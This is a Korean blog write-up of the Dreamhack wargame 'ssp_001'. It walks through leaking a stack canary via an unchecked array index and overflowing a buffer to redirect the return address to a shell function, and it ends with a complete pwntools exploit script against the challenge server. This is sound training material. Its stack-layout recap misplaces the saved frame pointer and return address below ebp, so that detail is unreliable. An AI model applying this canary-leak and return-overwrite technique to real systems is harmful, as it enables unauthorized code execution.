---
title: "[Dreamhack] ssp_001"
date: "2026-07-26T10:00:00"
last_modified_at: "2026-07-28 10:38:25"
canonical_id: "obsidian:hack/pwn/[Dreamhack] ssp_001.md"
categories: [Hack, Pwn]
tags: [canary, BOF]
author: "hothyun"
description: "Dreamhack ssp_001 문제를 분석하며 스택 카나리 유출과 버퍼 오버플로를 이용한 익스플로잇 과정을 정리합니다."
image: "/assets/img/posts/preview/hack/pwn/pwn1.webp"
---


거의 1년만에 쓰는 새 포스트다. 최근에 군 복무를 하면서 이리저리 일도 많고, 글을 쓰기 보다는 개발에 집중하고, 새로운 분야인 보안 및 해킹 분야를 도전하면서 포스팅을 한참을 미루다가 이제야 글을 쓴다.

글을 쓰게 된 계기는, 해킹 공부를 하는데, 이게 생각보다 어딘가에 정리해놓지 않고 하다보니까 자꾸만 까먹어서 어딘가에 정리를 해놓는 게 굉장히 중요하다고 생각해서 그렇다. 특히 CTF를 요즘 많이 나가는데, 관련해서 Write-up을 쓰는 것도 매우 중요하다고 생각해서, 간간히 CTF 나가는 게 있으면 Write-up도 올리려고 한다.

오늘 내가 정리할 문제는 Dreamhack에서 풀 수 있는 워게임 중 하나인 ssp_001 문제이다. 문제 링크는 [여기](https://dreamhack.io/wargame/challenges/33) 있다.

## 문제 분석

일단, 문제 파일을 받고 어떤 파일들이 있는지를 분석해보자.

파일을 받았더니 총 2개의 파일이 있었다. `ssp_001` 파일과, `ssp_001.c` 파일이 있었다. `ssp_001.c` 파일은 `ssp_001` 파일을 gcc로 컴파일 한 파일임을 알 수 있었다.

일단 실행 파일을 `file` 명령어와 `checksec` 명령어를 이용하여 간단하게 분석해보자.

```bash
$ file ./ssp_001
$ checksec ./ssp_001
```

결과는 아래와 같았다.

```text
file ./ssp_001

./ssp_001: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, 
BuildID[sha1]=6ee998115adcc2751595b8d60732998fe634dfd8, not stripped

checksec ./ssp_001

Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

컴파일된 파일은 ELF 32-bit LSB executable 이다. 그리고 Arch에 i386-32-little을 보니 32비트 운영체제에 little endian을 쓴다는 것을 알 수 있었다. 그리고 Canary found 라고 써진 것을 보니 Canary 보호 기법은 적용되어있고, NX enabled라고 적힌 것을 보니 Stack 영역에 실행 권한을 없앴다는 것을 알 수 있었다. 그런데 PIE가 No PIE(0x8048000) 이다. 이것은 ASLR로 인해 Stack, Heap, libc 영역 등의 주소는 바뀌어도, 코드 조각이 있는 주소는 0x8048000 기반으로 고정되어있다는 말이다. 마지막으로 Stripped: No는 코드 조각에서의 함수, 변수 이름 등이 그대로 남아있다는 뜻이다. 포너블 문제를 풀기 수월하게 세팅해둔 것 같다.

## 코드 분석

이제 코드를 분석할 차례다. 문제에서 내어준 코드가 있으니, 이를 분석해서 어디에 취약점이 있는지를 찾아보자.

```c
void get_shell() {
    system("/bin/sh");
}
```

먼저, `get_shell()` 함수가 눈에 보인다. 이 함수는 `/bin/sh` 를 실행하는 함수이므로, 사실 매우 보안상 위험한 함수이다. 심지어 Stripped: No 에다가 PIE도 안 켜져 있으니 이 함수의 주소를 gdb를 통해 손쉽게 알아내고, 이 코드 조각의 주소는 다른 실행환경에서 바뀌지도 않는다.

다음으로 `print_box`는 `box` 배열에서 인자로 받은 `idx` 위치에 있는 값을 출력하는 것 같고, `menu`의 경우 어떤 것을 선택할 수 있는지 화면상에 보여주는 함수 같다.

이제 `main` 이다.

```c
case 'F':
    printf("box input : ");
    read(0, box, sizeof(box));
    break;
```

`case F`는 box 배열에 값을 box 배열의 길이만큼 채워넣을 수 있는 것 같다.

```c
case 'P':
    printf("Element index : ");
    scanf("%d", &idx); // 값 검증을 하지 않는다. 우리가 원하는 위치의 값을 볼 수 있다.
    print_box(box, idx);
    break;
```

`case P`는 Element index를 scanf로 받고, 해당 위치의 값을 출력할 수 있는 것 같다. 그런데 여기서 취약한 점이 하나 있다. 바로, index의 값을 **검증을 하지 않는다** 는 것이다. 따라서, 우리는 box 배열 외부의 값에도 접근할 수 있는 길이 생겼다.

```c
case 'E':
    printf("Name Size : ");
    scanf("%d", &name_len);
    printf("Name : ");
    read(0, name, name_len); // name_len 값을 검증하지 않으므로 BOF 발생
    return 0;
```

`case E`는 `name` 배열에 입력한 `size` 만큼의 원하는 값을 넣을 수 있다. 여기서도 값 검증을 하지 않는다. 그래서 우리가 원하는 사이즈만큼 원하는 값을 넣을 수 있다. 여기서 `BOF(Buffer OverFlow)` 가 발생할 수 있다.

## Exploit 전략

이제 Exploit 전략을 짜보자. BOF 취약점이 있지만, Canary가 켜져있으므로 먼저 Canary를 얻어내야한다. 그리고 이 Leak 한 Canary를 정확한 위치에 포함하여 페이로드를 날려서 Canary 검증이 통과할 수 있게 해야한다.

1. Canary를 Leak 하기 위해 `case P`를 사용하여 Canary 위치의 Element 값을 조회한다.
2. Leak한 Canary와 gdb를 통해 얻은 Stack 구조 및 `get_shell()` 함수의 주소를 이용하여 `RET`을 `get_shell()`의 주소로 덮어쓴다.

## GDB로 Stack Frame 분석하기

컴파일된 ssp_001 파일을 gdb로 분석하여 각 변수들이 스택의 어느 부분에 할당되어있는지를 찾고, `get_shell()` 함수의 주소를 찾아보자.

```bash
$ chmod +x ./ssp_001 # 실행 권한 없으면 권한 먼저 주고
$ gdb ./ssp_001
```

먼저 Breakpoint를 *main에다가 걸어놓고 일단 프로그램을 실행시킨다.

그리고 disassemble 명령어를 사용해서 어셈블리가 어떻게 되어있는지를 살펴보자.

```text
0x0804872f <+4>:     sub    esp,0x94
0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
0x0804873e <+19>:    mov    eax,gs:0x14
0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
```

이 부분은 stack에 0x94 만큼의 메모리를 할당하고, gs:0x14로부터 난수값을 가져와서 ebp-0x8 주소에다가 저장하는 과정이다. 여기가 메모리 영역 할당 및, 카나리 값을 저장하는 어셈블리인 것 같다. 여기서 주목할 점은, ebp-0x4 에다가 카나리를 넣는 게 아니라, ebp-0x8에다가 넣는다. 그래서 카나리는 ebp-8 ~ ebp-5 범위에 있다. 그리고 카나리의 첫 바이트 값은 \x00 이므로, ebp-8 주소 값에 \x00이 들어가있고, 그 뒤에 3바이트가 나란히 카나리 값이 될 것이다.

```text
0x08048749 <+30>:    lea    edx,[ebp-0x88]
0x0804874f <+36>:    mov    eax,0x0
0x08048754 <+41>:    mov    ecx,0x10
0x08048759 <+46>:    mov    edi,edx
0x0804875b <+48>:    rep stos DWORD PTR es:[edi],eax
0x0804875d <+50>:    lea    edx,[ebp-0x48]
0x08048760 <+53>:    mov    eax,0x0
0x08048765 <+58>:    mov    ecx,0x10
0x0804876a <+63>:    mov    edi,edx
0x0804876c <+65>:    rep stos DWORD PTR es:[edi],eax
```

그리고 ebp-0x88 주소로부터 0x10만큼 초기화하는 어셈블리 및, ebp-0x48로부터 0x10만큼 초기화하는 어셈블리가 있다. 여기서는 name이랑 box 배열을 초기화하는 것으로 보인다.

```text
0x0804878b <+96>:    call   0x8048672 <initialize>
0x08048790 <+101>:   call   0x80486f1 <menu>
0x08048795 <+106>:   push   0x2
0x08048797 <+108>:   lea    eax,[ebp-0x8a]
0x0804879d <+114>:   push   eax
0x0804879e <+115>:   push   0x0
```

이 부분을 보니까, initialize를 하고 menu를 출력한 뒤, 차례대로 push를 하는 것이 보인다. i386-32-little 에서는 함수의 인자 값을 전달할 때 뒷 순서대로 차례대로 push를 한다. 그래서 사실상 이 코드는 read(0, select, 2) 코드가 어셈블리로 표현된 것이다. 따라서, 이를 보면 select 변수는 ebp-0x8a 로부터 2바이트(ebp-0x8a ~ ebp-0x89) 에 할당되어 있다고 할 수 있다.

```text
0x080487d3 <+168>:   push   0x40
0x080487d5 <+170>:   lea    eax,[ebp-0x88]
0x080487db <+176>:   push   eax
0x080487dc <+177>:   push   0x0
0x080487de <+179>:   call   0x80484a0 <read@plt>
```

그리고 지금 보는 부분은 두 번째 read가 나온 곳이다. 아까 select에서 첫 번째 read가 나오고, 순차적으로 봤을 때 두 번째 read는 case F에서 나온다. 따라서 지금 ebp-0x88 주소로부터 0x40 받는다고 인자 설정이 되어있으므로 case F에서 받으려는 box배열이  ebp-0x88 부터 0x40 만큼 할당되어있다고 할 수 있다.

```text
0x08048858 <+301>:   push   eax
0x08048859 <+302>:   lea    eax,[ebp-0x48]
0x0804885c <+305>:   push   eax
0x0804885d <+306>:   push   0x0
0x0804885f <+308>:   call   0x80484a0 <read@plt>
```

또, scanf 뒤에 어셈블리 상 마지막 read를 보면, ebp-0x48에서부터 read를 받는다. scanf와 read가 함께 있는 case는 E이므로, 여기서 name에 대해서 받는 것을 보면, name 배열의 영역이 ebp-0x48부터 ebp-0x9 까지 인 것을 알 수 있었다.

마지막으로, print get_shell 을 gdb 상에 입력하면,

```text
$1 = {<text variable, no debug info>} 0x80486b9 <get_shell>
```

이렇게 나와서 `get_shell()` 함수의 주소가 `0x80486b9` 인 것을 알 수 있었다.

자 이제 필요한 모든 정보가 구해졌다. 정리를 조금 해보자.

1. Canary는 ebp-0x8 ~ ebp-0x5 주소에 있다.
2. SFP는 ebp ~ ebp-0x3 주소에 있고, RET는 ebp-0x4 ~ ebp-0x7 주소에 있다.
3. box는 ebp-0x88 ~ ebp-0x49 주소에 있고, name은 ebp-0x48 ~ ebp-0x9 주소에 있다.
4. get_shell() 함수의 주소는 0x80486b9 이다.

이를 이용하여 exploit 코드를 짜보자.

## Exploit 코드 짜기

먼저, 각 case에 대해서 자동화된 기능을 사용할 수 있도록 함수를 만들었다.

```python
from pwn import *

r = remote("host3.dreamhack.games", 13821) # 원격 서버에서 실행

def menu(index):
        r.sendlineafter(b"> ", index) # menu에 index 입력

def F(box):
        menu(b"F")
        r.sendlineafter(b"box input : ", box) # box에 넣을 값 입력

def P(index):
        menu(b"P")
        r.sendlineafter(b"Element index : ", index) # 탐색할 index 입력

def E(size, name):
        menu(b"E")
        r.sendlineafter(b"Name Size : ", size) # name size 지정하고
        r.sendlineafter(b"Name : ", name) # name에 넣을 값 입력
```

이렇게 만들면, 밑에서 이 함수들을 이용해서 훨씬 편리하게 exploit 할 수 있다.

이제 카나리를 leak 해보자. case P를 이용하여서 카나리 주소에 접근해보자.

```python
box_canary_distance = 0x80 # box의 시작 주소와 canary의 시작 주소 값의 차이
cnry = "" # canary를 담을 변수

for i in range(4): # 카나리는 32비트 체계에서 4바이트이므로 4번 반복문 실행
    P(str(box_canary_distance+3-i).encode()) # ebp-0x5 부터 ebp-0x8까지 조회 -> 나중에 p32가 little_endian 해주므로 본래의 카나리 값을 그대로 추출(널 바이트가 가장 나중에 오게)
    r.recvuntil(b"is : ", timeout=1) # element 값 출력되는 부분까지 기준점을 땡겨서
    cnry += r.recvline().strip().decode() # 이제 출력되는 부분을 cnry에다가 담아준다.
```

이렇게 카나리를 leak을 하면, cnry 변수에는 "00" 으로 끝나는 4바이트 값이 들어온다.

그리고 이제 BOF 할 payload를 짜자.

```python
# name의 위치는 ebp-0x48 이므로, 0x40까지는 임의의 값으로 채우고, 카나리 값을 정수로 변환하고 p32를 통해 패킹해서 넣어주자.
# 그리고 아까 봤듯이, 카나리는 ebp-0x8 부터 4바이트이므로, ebp까지 ebp-0x4 ~ ebp-0x1 구간에 임의의 값으로 채우고, SFP 4바이트 또한 임의의 값으로 채워주자.
# 마지막으로 RET 위치에 덮어쓸 get_shell() 함수의 주소를 p32로 packing 해서 넣어주자.
payload = b"B"*0x40 + p32(int(cnry, 16)) + b"C"*0x4 + b"D"*0x4 + p32(0x80486b9)
E(str(0x50).encode(), payload) # 0x50만큼 입력 받을거고, 위에서 쓴 payload를 통해 BOF를 실현하자.
```

이와 같이 payload를 짜서 카나리 영역을 완벽하게 덮어쓰고, 카나리 뒤에 패딩 4바이트, SFP 4바이트를 잘 덮은 뒤, `get_shell()` 함수의 주소로 RET을 덮었다.

전체 코드는 아래와 같다.

```python
from pwn import *

r = remote("host3.dreamhack.games", 13821) # 원격 서버에서 실행

def menu(index):
        r.sendlineafter(b"> ", index) # menu에 index 입력

def F(box):
        menu(b"F")
        r.sendlineafter(b"box input : ", box) # box에 넣을 값 입력

def P(index):
        menu(b"P")
        r.sendlineafter(b"Element index : ", index) # 탐색할 index 입력

def E(size, name):
        menu(b"E")
        r.sendlineafter(b"Name Size : ", size) # name size 지정하고
        r.sendlineafter(b"Name : ", name) # name에 넣을 값 입력

box_canary_distance = 0x80 # box의 시작 주소와 canary의 시작 주소 값의 차이
cnry = "" # canary를 담을 변수

for i in range(4): # 카나리는 32비트 체계에서 4바이트이므로 4번 반복문 실행
    P(str(box_canary_distance+3-i).encode()) # ebp-0x5 부터 ebp-0x8까지 조회 -> 나중에 p32가 little_endian 해주므로 본래의 카나리 값을 그대로 추출(널 바이트가 가장 나중에 오게)
    r.recvuntil(b"is : ", timeout=1) # element 값 출력되는 부분까지 기준점을 땡겨서
    cnry += r.recvline().strip().decode() # 이제 출력되는 부분을 cnry에다가 담아준다.

# name의 위치는 ebp-0x48 이므로, 0x40까지는 임의의 값으로 채우고, 카나리 값을 정수로 변환하고 p32를 통해 패킹해서 넣어주자.
# 그리고 아까 봤듯이, 카나리는 ebp-0x8 부터 4바이트이므로, ebp까지 ebp-0x4 ~ ebp-0x1 구간에 임의의 값으로 채우고, SFP 4바이트 또한 임의의 값으로 채워주자.
# 마지막으로 RET 위치에 덮어쓸 get_shell() 함수의 주소를 p32로 packing 해서 넣어주자.
payload = b"B"*0x40 + p32(int(cnry, 16)) + b"C"*0x4 + b"D"*0x4 + p32(0x80486b9)
E(str(0x50).encode(), payload) # 0x50만큼 입력 받을거고, 위에서 쓴 payload를 통해 BOF를 실현하자.

r.interactive()
```

이렇게 코드를 짜서 실행하니, shell에 접근할 수 있었고, 여기서 `ls`를 통해 `flag`가 있는 것을 확인한 뒤, `cat flag`로 `flag`를 탈취하는 데에 성공했다!
